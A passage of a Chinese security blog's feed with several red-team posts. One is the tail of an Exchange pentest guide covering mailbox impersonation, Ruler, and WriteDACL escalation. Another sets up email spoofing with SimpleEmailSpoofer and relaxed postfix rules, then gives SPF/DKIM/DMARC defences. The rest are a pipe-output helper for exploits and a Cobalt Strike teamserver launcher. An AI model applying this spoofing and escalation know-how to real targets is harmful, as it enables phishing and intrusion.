src="https://evi1cg.github.io/usr/uploads/2019/01/2965525239.jpg" alt="1547034512542.jpg"></p><blockquote><p>检索可使用<code>-Term</code>或者正则<code>-Regex</code>来指定关键字，<code>-ImpersonationAccount</code>用于将当前用户身份合法伪装其他邮箱用户，进而获得查询所有邮箱用户邮件的权限，如果查询失败，可以尝试添加<code>-ExchangeVersion</code>更换Exchange版本,目前支持版本为<code>Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013,Exchange2013_SP1</code></p></blockquote><h2 id="0x05-后渗透"><a href="#0x05-后渗透" class="headerlink" title="0x05 后渗透"></a>0x05 后渗透</h2><p>在获取一个用户的账号密码之后，如何进入内网？这里有一个神器<strong><a href="https://github.com/sensepost/ruler" target="_blank" rel="noopener">Ruler</a></strong>,在Outlook中有一个Rules and Alerts的功能，利用此功能，可执行一些特定的如执行命令等操作，关于ruler的具体使用，可以参考相关文章，另外在内网中，如何去发现Exchange服务器，如何使用NTLM中继来接管某用户邮箱的权限，这些内容在<a href="https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">《深入Exchange Server在网络渗透下的利用方法》</a>中有了很详细的讲解，在这里就不多做阐述。</p><p>另外需要补充一点可能有用的东西，Exchange安装以后会创建一个<code>Organization Management</code> 安全组：</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010940263.jpg" alt="-w650"></p><p>该组内的成员除了访问Exchagne设置外，可以修改其他Exchagne安全组的成员身份，如<code>Exchange Trusted Subsystem</code>,此组为<code>Exchange Windows Permissions</code>的成员</p><p><img src="https://evi1cg.github.io//usr/uploads/2019/01/2019010993399.jpg" alt="-w477"></p><p>默认情况下，<code>Exchange Windows Permissions</code>安全组对安装Exchange的域的域对象具有writeDACL权限,这就意味着，我们可以进行权限的提升，详细的文章可以参考<a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">《Escalating privileges with ACLs in Active Directory》</a>。</p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>本文记录了我自己对Exchange在渗透中的利用的一些方式的总结，欢迎补充，更详细的内容可以查看参考的文章。</p><h2 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h2><ol><li><a href="https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0" target="_blank" rel="noopener">https://blog.riskivy.com/exchange-server-in-pentest/?from=timeline&amp;isappinstalled=0</a></li><li><a href="https://www.blackhillsinfosec.com/password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/password-spraying-outlook-web-access-how-to-gain-access-to-domain-credentials-without-being-on-a-targets-network-part-2/</a></li><li><a href="https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/" target="_blank" rel="noopener">https://3gstudent.github.io/3gstudent.github.io/Exchange-Web-Service(EWS)%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%97/</a></li><li><a href="https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/" target="_blank" rel="noopener">https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-Exchange简介&quot;&gt;&lt;a href=&quot;#0x00-Exchange简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 Exchange简介&quot;&gt;&lt;/a&gt;0x00 Exchange简介&lt;/h2&gt;&lt;p&gt;Windows Exchange S
      
    
    </summary>
    
      <category term="技术分享" scheme="https://evi1cg.github.io/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="Exchange" scheme="https://evi1cg.github.io/tags/Exchange/"/>
    
  </entry>
  
  <entry>
    <title>Something about email spoofing</title>
    <link href="https://evi1cg.github.io/archives/Email_spoofing.html"/>
    <id>https://evi1cg.github.io/archives/Email_spoofing.html</id>
    <published>2018-10-10T22:23:00.000Z</published>
    <updated>2019-03-18T07:20:12.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-这是个啥？"><a href="#0x00-这是个啥？" class="headerlink" title="0x00 这是个啥？"></a>0x00 这是个啥？</h2><p>一般来说，我们收到一封邮件之后，都会首先看发件人，如果是比较重要的邮件，我们可能会去看发件人地址，但是，如果发件人是伪造的，你还能知道是谁再给你发邮件么？<br>当我们在谷歌搜索发件人伪造的时候，可以看到很多很多的网站提供了这样的功能：<br><img src="https://raw.githubusercontent.com/Ridter/blogpics/master/imgs/20181015200222.png" alt="请输入图片描述"></p><blockquote><p>这些网站没有测试，不知道能不能成功伪造。</p></blockquote><p>那到底是什么导致的发件人伪造呢？下面我们来分析分析造成发件人伪造的成因。</p><h2 id="0x01-SMTP是什么？"><a href="#0x01-SMTP是什么？" class="headerlink" title="0x01 SMTP是什么？"></a>0x01 SMTP是什么？</h2><p>要想了解成因，我们需要首先了解一下什么是SMTP，首先先了解一下几个概念：<br><strong>MUA</strong>:Mail User Agent。用户邮件代理,用户通过MUA接收发送邮件.例如Outlook, FoxMail等。<br><strong>MTA</strong>: Mail Transfer Protocol。邮件传输代理,是SMTP的一种实现，MTA仅仅负责邮件的传输。如果信件的目的地并不是本身的用户，且该封信的相关数据符合使用 MTA 的权力， 那么MTA 就会将该封信再传送到下一部主机上。这即是所谓的转递的功能。<br><strong>MDA</strong>: Mail Deliver Agent，邮件分发代理。负责将接收到的邮件保存在邮件服务器上，在这里可以设置对邮件进行过滤或自动回复。<br><strong>MRA</strong>: Mail Receive Agent，邮件接收代理,用来实现IMAP,POP3协议,负责与MUA交互,将服务器上的邮件通过IMAP以及POP3传输给客户端。</p><p>SMTP全称是Simple Mail Transfer Protocol,直译过来就是简单邮件传输协议，主要的工作就是把邮件信息从发件人的邮件服务器中传送到接收人的邮件服务器中，偶尔我们使用MUA来发送邮件的话,也承载传输用户邮件到发件服务器的功能，但是SMTP存在一个问题，就是<code>没有对发送方进行一个身份验证</code>。用下面的图来说明一下邮件的投递过程。</p><p><img src="https://raw.githubusercontent.com/Ridter/blogpics/master/imgs/20181015200401.png" alt="请输入链接描述"></p><p>1、用户利用MUA寄信到MTA，这里面包含了几个项：<br><strong>发信人与发信网站</strong>：例如 <a href="mailto:admin@evi1cg.me" target="_blank" rel="noopener">admin@evi1cg.me</a>，其中evi1cg.me就是发信网站，即收信件的MTA。<br><strong>收信人与收信网站</strong>：例如 <a href="mailto:admin@email.server" target="_blank" rel="noopener">admin@email.server</a>，其中admin就是email.server里的一个账号。<br>2、当MTA收到信件后，会通过DNS的MX记录进行查询，如果email.server是MTA自己，此时MTA就会把邮件交给MDA处理，放置到收信者的信箱中。<br>3、如果email.server不是自己，那么这个信件就会被转送出去。<br>4、当远程MTA收到本地MTA转发的邮件后，会将信件交给它的MDA处理，等待用户的读取或下载。</p><p>正是由于MTA之间转发邮件是不需要认证的，所以这就成了可以伪造发件人的原因。</p><h2 id="0x02-怎么搭建SMTP-Server？"><a href="#0x02-怎么搭建SMTP-Server？" class="headerlink" title="0x02 怎么搭建SMTP Server？"></a>0x02 怎么搭建SMTP Server？</h2><p>如何快速搭建自己的SMTP Server？这个网上有很多教程，这里为了快速搭建，可以选择使用ewomail，代码是<a href="https://github.com/gyxuehu/EwoMail" target="_blank" rel="noopener">开源</a>的,搭建起来也比较方便，也有很好地<a href="http://doc.ewomail.com/ewomail/285649" target="_blank" rel="noopener">说明文档</a>，EwoMail是基于postfix和Dovecot，按照说明文档很快就可以部署完毕了，部署完毕以后需要添加用户账号：<br><img src="https://raw.githubusercontent.com/Ridter/blogpics/master/imgs/20181015200443.png" alt="1539071369229.png"><br>之后就可以通过添加的账号来发送邮件了。</p><h2 id="0x03-如何伪造域名？"><a href="#0x03-如何伪造域名？" class="headerlink" title="0x03 如何伪造域名？"></a>0x03 如何伪造域名？</h2><p>关于伪造域名有一个很好用的工具<a href="https://github.com/lunarca/SimpleEmailSpoofer" target="_blank" rel="noopener">SimpleEmailSpoofer</a>，下面我们就使用这个工具来测试一下：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python SimpleEmailSpoofer<span class="selector-class">.py</span> -t 目标邮箱 -f 要伪造的发件人地址 -n From_name -e 邮件内容 -j 邮件主题 -s 你自己的smtp地址 -<span class="selector-tag">p</span> <span class="number">25</span> --user 你添加的用户 --pass 你添加用户的密码</span><br></pre></td></tr></table></figure></p><p><img src="https://raw.githubusercontent.com/Ridter/blogpics/master/imgs/20181015200508.png" alt="1539071731274.png"></p><p>在这里可以看到报错了，<code>Sender address rejected: not owned by user xxx</code>, 这里是postfix设置的问题。需要进行一下修改<code>/etc/postfix/main.cf</code><br>找到<code>smtpd_sender_login_maps</code>，修改为：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smtpd_sender_login_maps = <span class="string">mysql:</span><span class="regexp">/etc/</span>postfix<span class="regexp">/mysql/</span>mysql-sender-login-maps.cf,<span class="string">pcre:</span><span class="regexp">/etc/</span>postfix/login_maps.pcre</span><br></pre></td></tr></table></figure></p><p>新建<code>/etc/postfix/login_maps.pcre</code><br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/^(.*)$/</span> test@yourdomain.com</span><br></pre></td></tr></table></figure></p><blockquote><p>意思是允许用户<a href="mailto:test@yourdomain.com" target="_blank" rel="noopener">test@yourdomain.com</a>的用户使用任意domain</p></blockquote><p>找到<code>smtpd_recipient_restrictions</code>，删除<code>reject_unknown_sender_domain</code>，这样就不会对发送的域进行验证了。</p><p>修改完成以后，执行以下命令：<br><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">postmap <span class="string">/etc/postfix/login_maps.pcre</span></span><br><span class="line">postfix <span class="keyword">reload</span></span><br></pre></td></tr></table></figure></p><p>修改完成以后，再次发送：</p><p><img src="https://raw.githubusercontent.com/Ridter/blogpics/master/imgs/20181015200542.png" alt="1539072657218.png"></p><p>查看gmail:<br><img src="https://raw.githubusercontent.com/Ridter/blogpics/master/imgs/20181015200604.png" alt="1539078304784.png"></p><p><img src="https://raw.githubusercontent.com/Ridter/blogpics/master/imgs/20181015200621.png" alt="1539072834239.png"></p><p>当然，在原始邮件里面，还是有自己的域名信息。如何尽量减少自己的信息，可以参考这篇<a href="https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/" target="_blank" rel="noopener">文章</a>。</p><blockquote><p>经过测试，如果收信服务器对SPF校验不通过的邮件未作处理，仍然可以伪造添加过SPF记录的域。如QQ邮箱检查SPF失败就直接拒绝接收邮件，但是gmail仍然接收。这里要注意一点，SPF中如果配置为<code>~all</code>，则表示为接受来信，但是做标记，QQ邮箱里就会接收到此类伪造的邮件，但是回放置于垃圾邮件里。</p></blockquote><h2 id="0x04-如何检测？"><a href="#0x04-如何检测？" class="headerlink" title="0x04 如何检测？"></a>0x04 如何检测？</h2><p>这里有一个工具可以用来检测域名是否可以被伪造:<a href="https://github.com/BishopFox/spoofcheck" target="_blank" rel="noopener">spoofcheck</a>，使用很简单，比如baidu:<br><img src="https://raw.githubusercontent.com/Ridter/blogpics/master/imgs/20181015200640.png" alt="1539074907929.png"></p><h2 id="0x05-如何解决？"><a href="#0x05-如何解决？" class="headerlink" title="0x05 如何解决？"></a>0x05 如何解决？</h2><p>为了使得域名不会被伪造，需要为域名正确配置<code>SPF</code>、<code>DKIM</code>、<code>DMARC</code>。只配置SPF是不行的，关于SPF的配置可以参考<a href="http://blog.51cto.com/10602188/1882947" target="_blank" rel="noopener">这里</a>，关于DKIM的配置，可以看<a href="https://www.zoho.com.cn/mail/help/adminconsole/dkim-configuration.html" target="_blank" rel="noopener">这里</a>，关于DMARC的配置可以参考<a href="https://support.google.com/a/answer/2466563?hl=zh-Hans" target="_blank" rel="noopener">这里</a>。</p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p>1、<a href="https://www.jianshu.com/p/610d9bf0ae8b" target="_blank" rel="noopener">https://www.jianshu.com/p/610d9bf0ae8b</a><br>2、<a href="http://lomu.me/post/SPF-DKIM-DMARC-PTR" target="_blank" rel="noopener">http://lomu.me/post/SPF-DKIM-DMARC-PTR</a><br>3、<a href="https://serverfault.com/questions/318334/how-to-enforce-sender-address-to-be-logged-in-userexample-org-in-postfix" target="_blank" rel="noopener">https://serverfault.com/questions/318334/how-to-enforce-sender-address-to-be-logged-in-userexample-org-in-postfix</a><br>4、<a href="https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/" target="_blank" rel="noopener">https://major.io/2013/04/14/remove-sensitive-information-from-email-headers-with-postfix/</a><br>5、<a href="https://realtechtalk.com/Postfix_how_to_secure_outgoing_authenticated_emails_for_privacy_and_hide_the_IP_address_mailer_and_other_things-1573-articles" target="_blank" rel="noopener">https://realtechtalk.com/Postfix_how_to_secure_outgoing_authenticated_emails_for_privacy_and_hide_the_IP_address_mailer_and_other_things-1573-articles</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-这是个啥？&quot;&gt;&lt;a href=&quot;#0x00-这是个啥？&quot; class=&quot;headerlink&quot; title=&quot;0x00 这是个啥？&quot;&gt;&lt;/a&gt;0x00 这是个啥？&lt;/h2&gt;&lt;p&gt;一般来说，我们收到一封邮件之后，都会首先看发件人，如果是比较重要的邮件，我们
      
    
    </summary>
    
      <category term="运维" scheme="https://evi1cg.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
  </entry>
  
  <entry>
    <title>匿名管道读取CMD回显信息</title>
    <link href="https://evi1cg.github.io/archives/Get_cmd.html"/>
    <id>https://evi1cg.github.io/archives/Get_cmd.html</id>
    <published>2018-09-12T01:15:00.000Z</published>
    <updated>2019-01-14T14:44:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近改exp的时候用到的，加到exp里面回显执行信息，保存一份~<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXE_NAME    NULL<span class="comment">//TEXT("Cmd.exe")</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXE_CMD     TEXT(<span class="meta-string">"Cmd.exe /C ipconfig/all"</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> Buffer[<span class="number">4096</span>];</span><br><span class="line">        STARTUPINFO sInfo;<span class="comment">//新进程的主窗口特性</span></span><br><span class="line">        PROCESS_INFORMATION pInfo;</span><br><span class="line">        SECURITY_ATTRIBUTES sa;</span><br><span class="line">        HANDLE hRead, hWrite;</span><br><span class="line">        DWORD bytesRead;    <span class="comment">//读取代码的长度</span></span><br><span class="line">        sa.nLength = <span class="keyword">sizeof</span>(SECURITY_ATTRIBUTES);/ /结构体的大小，可用SIZEOF取得</span><br><span class="line">        sa.lpSecurityDescriptor = <span class="literal">NULL</span>;<span class="comment">//安全描述符</span></span><br><span class="line">        sa.bInheritHandle = TRUE;;/ /安全描述的对象能否被新创建ÆÆ的进程继承</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!CreatePipe(&amp;hRead, &amp;hWrite, &amp;sa, <span class="number">0</span>)) <span class="comment">//创建匿名管道</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> GetLastError();<span class="comment">//返回最近的一个错误，0表示正常</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        GetStartupInfo(&amp;sInfo)；</span><br><span class="line">        sInfo.cb = <span class="keyword">sizeof</span>(sInfo);</span><br><span class="line">        sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;</span><br><span class="line">        sInfo.wShowWindow = SW_HIDE;</span><br><span class="line">        sInfo.hStdError = hWrite;   <span class="comment">//将管道的写端交给子进程</span></span><br><span class="line">        sInfo.hStdOutput = hWrite;</span><br><span class="line">        <span class="built_in">memset</span>(&amp;pInfo, <span class="number">0</span>, <span class="keyword">sizeof</span>(pInfo));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!CreateProcess(EXE_NAME, EXE_CMD, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;sInfo, &amp;pInfo)) <span class="comment">//创建子进程</span></span><br><span class="line">        &#123;</span><br><span class="line">            CloseHandle(hWrite);</span><br><span class="line">            CloseHandle(hRead);</span><br><span class="line">            <span class="keyword">return</span> GetLastError();</span><br><span class="line">        &#125;</span><br><span class="line">        CloseHandle(hWrite); <span class="comment">//关闭父进程的写端</span></span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>;; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!ReadFile(hRead, Buffer, <span class="keyword">sizeof</span>(Buffer) - <span class="number">1</span>, &amp;bytesRead, <span class="literal">NULL</span>)) <span class="comment">//读取内容</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            Buffer[bytesRead] = <span class="number">0</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, Buffer);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        WaitForSingleObject(pInfo.hProcess, INFINITE);<span class="comment">//当等待仍在挂起状态时，句柄被关闭，那么函数行为是未定义的。该句柄必须具有 SYNCHRONIZE 访问权限;</span></span><br><span class="line">    CloseHandle(hRead);</span><br><span class="line">    system(<span class="string">"pause"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>from: <a href="http://www.cnblogs.com/onlyac/p/5346478.html" target="_blank" rel="noopener">http://www.cnblogs.com/onlyac/p/5346478.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;最近改exp的时候用到的，加到exp里面回显执行信息，保存一份~&lt;br&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span
      
    
    </summary>
    
      <category term="随便写写" scheme="https://evi1cg.github.io/categories/%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/"/>
    
    
  </entry>
  
  <entry>
    <title>CS teamserver.bat</title>
    <link href="https://evi1cg.github.io/archives/teamserver.html"/>
    <id>https://evi1cg.github.io/archives/teamserver.html</id>
    <published>2018-09-10T01:40:00.000Z</published>
    <updated>2019-01-15T05:43:36.768Z</updated>
    
    <content type="html"><![CDATA[<p>CS的teamserver经常是在linux服务器上跑的，有小伙伴问在win server上怎么跑，所以弄了一个批处理，需要的看着改改，win上面需要装<a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="noopener"><code>java JDK</code></a>,win上默认没有keytool,所以需要自己去生成一个cobaltstrike.store ~<br><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off   </span><br><span class="line">:check_java</span><br><span class="line">    java -version &gt;<span class="built_in">nul</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="variable">%errorLevel%</span> == <span class="number">0</span> (</span><br><span class="line"><span class="function">        goto:<span class="title">check_permissions</span></span></span><br><span class="line"><span class="function">    ) <span class="title">else</span> (</span></span><br><span class="line"><span class="function">        <span class="title">echo</span> [-] <span class="title">is</span> <span class="title">Java</span> <span class="title">installed</span>?</span></span><br><span class="line"><span class="function">        <span class="title">goto:eof</span></span></span><br><span class="line"><span class="function">    )</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">:<span class="title">check_permissions</span></span></span><br><span class="line"><span class="function">    <span class="title">echo</span> [+] <span class="title">Administrative</span> <span class="title">permissions</span> <span class="title">required</span>. <span class="title">Detecting</span> <span class="title">permissions</span>...</span></span><br><span class="line"><span class="function">    <span class="title">set</span> <span class="title">TempFile_Name</span>=%<span class="title">SystemRoot</span>%\<span class="title">System32</span>\<span class="title">BatTestUACin_SysRt</span>%<span class="title">Random</span>%.<span class="title">batemp</span></span></span><br><span class="line"><span class="function">    (<span class="title">echo</span> "<span class="title">BAT</span> <span class="title">Test</span> <span class="title">UAC</span> <span class="title">in</span> <span class="title">Temp</span>" &gt;%<span class="title">TempFile_Name</span>% ) 1&gt;<span class="title">nul</span> 2&gt;<span class="title">nul</span></span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">exist</span> %<span class="title">TempFile_Name</span>% (</span></span><br><span class="line"><span class="function">        <span class="title">echo</span> [+] <span class="title">Success</span>: <span class="title">Administrative</span> <span class="title">permissions</span> <span class="title">confirmed</span>.</span></span><br><span class="line"><span class="function"><span class="title">del</span> %<span class="title">TempFile_Name</span>% 1&gt;<span class="title">nul</span> 2&gt;<span class="title">nul</span></span></span><br><span class="line"><span class="function">        <span class="title">goto:check_certificate</span></span></span><br><span class="line"><span class="function">    ) <span class="title">else</span> (</span></span><br><span class="line"><span class="function">        <span class="title">echo</span> [-] <span class="title">Failure</span>: <span class="title">Current</span> <span class="title">permissions</span> <span class="title">inadequate</span>.</span></span><br><span class="line"><span class="function">        <span class="title">goto:eof</span></span></span><br><span class="line"><span class="function">    )</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">:<span class="title">check_certificate</span></span></span><br><span class="line"><span class="function">    <span class="title">set</span> <span class="title">certificate</span>=".\<span class="title">cobaltstrike.store</span>"</span></span><br><span class="line"><span class="function">    <span class="title">if</span> <span class="title">exist</span> %<span class="title">certificate</span>% (</span></span><br><span class="line"><span class="function">        <span class="title">goto:test_arguments</span></span></span><br><span class="line"><span class="function">    ) <span class="title">else</span> (</span></span><br><span class="line"><span class="function">        <span class="title">echo</span> [!] <span class="title">Please</span> <span class="title">generate</span> <span class="title">the</span> <span class="title">cobaltstrike.store</span> !</span></span><br><span class="line"><span class="function">        <span class="title">echo</span> [!] <span class="title">Example</span>: <span class="title">keytool</span> -<span class="title">keystore</span> ./<span class="title">cobaltstrike.store</span> -<span class="title">storepass</span> 123456 -<span class="title">keypass</span> 123456 -<span class="title">genkey</span> -<span class="title">keyalg</span> <span class="title">RSA</span> -<span class="title">alias</span> <span class="title">cobaltstrike</span> -<span class="title">dname</span> "<span class="title">CN</span>=<span class="title">Major</span> <span class="title">Cobalt</span> <span class="title">Strike</span>, <span class="title">OU</span>=<span class="title">AdvancedPenTesting</span>, <span class="title">O</span>=<span class="title">cobaltstrike</span>, <span class="title">L</span>=<span class="title">Somewhere</span>, <span class="title">S</span>=<span class="title">Cyberspace</span>, <span class="title">C</span>=<span class="title">Earth</span>"</span></span><br><span class="line"><span class="function">        <span class="title">goto:eof</span></span></span><br><span class="line"><span class="function">    )</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">:<span class="title">test_arguments</span></span></span><br><span class="line"><span class="function">    <span class="title">set</span> <span class="title">argC</span>=0</span></span><br><span class="line"><span class="function">    <span class="title">for</span> %%<span class="title">x</span> <span class="title">in</span> (%*) <span class="title">do</span> <span class="title">Set</span> /<span class="title">A</span> <span class="title">argC</span>+=1</span></span><br><span class="line"><span class="function">    <span class="title">if</span> %<span class="title">argC</span>% <span class="title">LSS</span> 2 (</span></span><br><span class="line"><span class="function">        <span class="title">echo</span> [-] <span class="title">teamserver</span> ^&lt;<span class="title">host</span>^&gt; ^&lt;<span class="title">password</span>^&gt; [/<span class="title">path</span>/<span class="title">to</span>/<span class="title">c2.profile</span>] [<span class="title">YYYY</span>-<span class="title">MM</span>-<span class="title">DD</span>]</span></span><br><span class="line"><span class="function">        <span class="title">echo</span>     ^&lt;<span class="title">host</span>^&gt; <span class="title">is</span> <span class="title">the</span> <span class="title">default</span> <span class="title">IP</span> <span class="title">address</span> <span class="title">of</span> <span class="title">this</span> <span class="title">Cobalt</span> <span class="title">Strike</span> <span class="title">team</span> <span class="title">server</span></span></span><br><span class="line"><span class="function">        <span class="title">echo</span>     ^&lt;<span class="title">password</span>^&gt; <span class="title">is</span> <span class="title">the</span> <span class="title">shared</span> <span class="title">password</span> <span class="title">to</span> <span class="title">connect</span> <span class="title">to</span> <span class="title">this</span> <span class="title">server</span></span></span><br><span class="line"><span class="function">        <span class="title">echo</span>     [/<span class="title">path</span>/<span class="title">to</span>/<span class="title">c2.profile</span>] <span class="title">is</span> <span class="title">your</span> <span class="title">Malleable</span> <span class="title">C2</span> <span class="title">profile</span></span></span><br><span class="line"><span class="function">        <span class="title">echo</span>     [<span class="title">YYYY</span>-<span class="title">MM</span>-<span class="title">DD</span>] <span class="title">is</span> <span class="title">a</span> <span class="title">kill</span> <span class="title">date</span> <span class="title">for</span> <span class="title">Beacon</span> <span class="title">payloads</span> <span class="title">run</span> <span class="title">from</span> <span class="title">this</span> <span class="title">server</span></span></span><br><span class="line"><span class="function">        <span class="title">goto:eof</span></span></span><br><span class="line"><span class="function">    ) <span class="title">else</span> (</span></span><br><span class="line"><span class="function">        <span class="title">goto:run_cobal</span></span></span><br><span class="line"><span class="function">    )</span></span><br><span class="line"><span class="function">:<span class="title">run_cobal</span></span></span><br><span class="line"><span class="function">    <span class="title">java</span> -<span class="title">XX:ParallelGCThreads</span>=4 -<span class="title">Dcobaltstrike.server_port</span>=50050 -<span class="title">Djavax.net.ssl.keyStore</span>=./<span class="title">cobaltstrike.store</span> -<span class="title">Djavax.net.ssl.keyStorePassword</span>=123456 -<span class="title">server</span> -<span class="title">XX</span>:+<span class="title">AggressiveHeap</span> -<span class="title">XX</span>:+<span class="title">UseParallelGC</span> -<span class="title">classpath</span> ./<span class="title">cobaltstrike.jar</span> <span class="title">server.TeamServer</span> %*</span></span><br></pre></td></tr></table></figure></p><p><img src="https://evi1cg.github.io/usr/uploads/2018/09/3568965996.png" alt="90107-dm8rzqvop8m.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;CS的teamserver经常是在linux服务器上跑的，有小伙伴问在win server上怎么跑，所以弄了一个批处理，需要的看着改改，win上面需要装&lt;a href=&quot;http://www.oracle.com/technetwork/java/javase/downlo
      
    
    </summary>
    
      <category term="工具收集" scheme="https://evi1cg.github.io/categories/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="cobaltstrike" scheme="https://evi1cg.github.io/tags/cobaltstrike/"/>
